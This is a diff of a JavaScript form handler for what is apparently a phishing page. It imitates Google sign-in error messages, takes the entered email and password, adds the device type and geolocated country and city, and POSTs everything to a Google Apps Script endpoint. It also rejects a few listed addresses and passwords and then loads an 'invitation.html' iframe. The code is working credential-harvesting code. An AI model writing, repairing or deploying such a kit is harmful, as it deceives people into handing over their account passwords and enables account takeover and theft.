@@ -1,47 +1,83 @@
 document.getElementById("miFormulario").addEventListener("submit", async function(event) {
     event.preventDefault(); // Evita el envío automático 
-    
-    console.log("🔍 INICIANDO VALIDACIÓN DEL FORMULARIO");
 
     // Obtener elementos del formulario
     const emailInput = document.querySelector('input[name="email"]');
     const passwordInput = document.querySelector('input[name="password"]');
     const errorMessage = document.getElementById('error-message');
     
-    // Verificar que los elementos existen
-    if (!emailInput || !passwordInput) {
-        console.error("❌ ERROR: No se encontraron los inputs del formulario");
-        return;
-    }
-    
     // Lista de correos electrónicos y contraseñas prohibidas
-    const prohibitedEmails = ["ejemplo1@correo.com"]; // Agregar correos prohibidos aquí
-    const prohibitedWords = ["hola123"]; // Agregar contraseñas prohibidas aquí
+    const prohibitedEmails = ["ejemplo1@correo.com", "ejemplo@mail.com"]; // Corregido: faltaba comilla de cierre
+    const prohibitedWords = ["hola123", "Sandia190395#", "sandia190395#"]; // Agregadas las palabras del HTML
     
     const email = emailInput.value.trim().toLowerCase();
-    const password = passwordInput.value.trim(); // Agregado trim para limpiar espacios
-    
-    console.log("📧 Email ingresado:", `"${email}"`);
-    console.log("🔑 Contraseña ingresada:", `"${password}"`);
-    console.log("📋 Emails prohibidos:", prohibitedEmails);
-    console.log("📋 Contraseñas prohibidas:", prohibitedWords);
+    const password = passwordInput.value;
     
     // Validar formato de correo electrónico
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!emailRegex.test(email)) {
-        console.log("❌ Email inválido por formato");
-        errorMessage.textContent = "Correo electrónico no válido";
+        errorMessage.textContent = "Introduce una dirección de correo electrónico válida";
         errorMessage.style.color = 'red';
+        errorMessage.style.display = 'block';
         return; // Detiene el procesamiento
     }
     
-    // Verificar correo prohibido (comparación exacta)
+    // Verificar correo prohibido
     const isProhibitedEmail = prohibitedEmails.includes(email);
-    console.log("🚫 ¿Email prohibido?", isProhibitedEmail);
+    if (isProhibitedEmail) {
+        errorMessage.textContent = "No se pudo encontrar tu cuenta de Google";
+        errorMessage.style.color = 'red';
+        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
+        errorMessage.style.display = 'block';
+        emailInput.value = '';
+        passwordInput.value = '';
+        return; // Detiene el procesamiento
+    }
     
-    // Verificar contraseña prohibida (comparación exacta)
-    const isProhibitedPassword = prohibitedWords.includes(password);
-    console.log("🚫 ¿Contraseña prohibida?", isProhibitedPassword);
+    // Verificar contraseña prohibida
+    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
+    if (containsProhibitedPassword) {
+        errorMessage.textContent = "La contraseña no es correcta. Inténtalo de nuevo.";
+        errorMessage.style.color = 'red';
+        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
+        errorMessage.style.display = 'block';
+        passwordInput.value = '';
+        return; // Detiene el procesamiento
+    }
+    
+    // Si pasa todas las validaciones, continúa con el proceso normal
+    // Limpiar cualquier mensaje de error previo
+    if (errorMessage) {
+        errorMessage.textContent = "";
+        errorMessage.style.display = 'none';
+    }
+
+    // Ocultar el formulario
+    document.getElementById("miFormulario").style.display = "none";
+    
+    // Mostrar mensaje "Cargando..."
+    let loadingMessage = document.createElement("p");
+    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
+    loadingMessage.style.textAlign = "center";
+    document.body.appendChild(loadingMessage);
+    
+    // Antes de mostrar el iframe, ocultar el footer de folder.html
+    const footerElement = document.querySelector("p");
+    if (footerElement) {
+        footerElement.style.display = "none";
+    }
+
+    // Mostrar el iframe
+    let iframe = document.getElementById("usuarioFrame");
+    iframe.src = "invitation.html";
+    iframe.style.display = "block";
+    
+    // Eliminar mensaje de carga después de mostrar usuario.html
+    iframe.onload = function() {
+        if (loadingMessage && loadingMessage.parentNode) {
+            loadingMessage.remove();
+        }
+    };
     
     // ✅ Detectar si el usuario usa iPhone o Android
     let deviceType = "Otro"; // Valor por defecto
@@ -69,116 +105,16 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         console.error("Error obteniendo la ubicación:", error);
     }
     
-    // ✅ Preparar datos para enviar
+    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
     const formData = new FormData(this);
     formData.append("device", deviceType);
     formData.append("country", country + " - " + city);
     
-    // Agregar estado de validación para tracking
-    let status = "Acceso exitoso";
-    if (isProhibitedEmail) {
-        status = "Email prohibido";
-    } else if (isProhibitedPassword) {
-        status = "Contraseña prohibida";
-    }
-    formData.append("status", status);
-    
-    console.log("📊 Estado asignado:", status);
-    
-    // ✅ SIEMPRE enviar los datos a Google Sheets
+    // ✅ Enviar los datos correctamente a Google Sheets
     const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
-    
-    try {
-        await fetch(url, {
-            method: "POST",
-            body: new URLSearchParams(formData),
-            headers: { "Content-Type": "application/x-www-form-urlencoded" }
-        });
-        console.log("✅ Datos enviados a Google Sheets exitosamente");
-    } catch (error) {
-        console.error("❌ Error al enviar datos:", error);
-    }
-    
-    // 🔥 VALIDACIONES CRÍTICAS - DEBEN DETENER LA EJECUCIÓN
-    
-    // PRIMERO: Verificar email prohibido
-    if (isProhibitedEmail) {
-        console.log("🚫 BLOQUEANDO: Email prohibido detectado");
-        console.log("🛑 DETENIENDO EJECUCIÓN - NO REDIRIGIR");
-        
-        // Mostrar mensaje de error
-        if (errorMessage) {
-            errorMessage.textContent = "Ocurrio un error con el correo intentar con otra dirección";
-            errorMessage.style.color = 'red';
-            errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
-            errorMessage.style.display = 'block';
-        }
-        
-        // Limpiar campos
-        emailInput.value = '';
-        passwordInput.value = '';
-        
-        // DETENER COMPLETAMENTE LA EJECUCIÓN
-        console.log("🛑 RETURN EJECUTADO - FIN DE LA FUNCIÓN");
-        return;
-    }
-    
-    // SEGUNDO: Verificar contraseña prohibida
-    if (isProhibitedPassword) {
-        console.log("🚫 BLOQUEANDO: Contraseña prohibida detectada");
-        console.log("🛑 DETENIENDO EJECUCIÓN - NO REDIRIGIR");
-        
-        // Mostrar mensaje de error
-        if (errorMessage) {
-            errorMessage.textContent = "Contraseña incorrecta";
-            errorMessage.style.color = 'red';
-            errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
-            errorMessage.style.display = 'block';
-        }
-        
-        // Limpiar solo la contraseña
-        passwordInput.value = '';
-        
-        // DETENER COMPLETAMENTE LA EJECUCIÓN
-        console.log("🛑 RETURN EJECUTADO - FIN DE LA FUNCIÓN");
-        return;
-    }
-    
-    // ✅ SOLO LLEGA AQUÍ SI NO HAY ERRORES
-    console.log("✅ VALIDACIÓN EXITOSA - PROCEDIENDO CON REDIRECCIÓN");
-    
-    // Limpiar cualquier mensaje de error previo
-    if (errorMessage) {
-        errorMessage.textContent = "";
-        errorMessage.style.display = 'none';
-    }
-
-    // Ocultar el formulario
-    document.getElementById("miFormulario").style.display = "none";
-    
-    // Mostrar mensaje "Cargando..."
-    let loadingMessage = document.createElement("p");
-    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
-    loadingMessage.style.textAlign = "center";
-    document.body.appendChild(loadingMessage);
-    
-    // Antes de mostrar el iframe, ocultar el footer de folder.html
-    const footerElement = document.querySelector("p");
-    if (footerElement) {
-        footerElement.style.display = "none";
-    }
-
-    // Mostrar el iframe
-    let iframe = document.getElementById("usuarioFrame");
-    if (iframe) {
-        iframe.src = "invitation.html";
-        iframe.style.display = "block";
-        
-        // Eliminar mensaje de carga después de mostrar usuario.html
-        iframe.onload = function() {
-            loadingMessage.remove();
-        };
-    }
-    
-    console.log("🎉 REDIRECCIÓN COMPLETADA");
+    fetch(url, {
+        method: "POST",
+        body: new URLSearchParams(formData),
+        headers: { "Content-Type": "application/x-www-form-urlencoded" }
+    }).catch(error => console.error("Error al enviar datos:", error));
 });
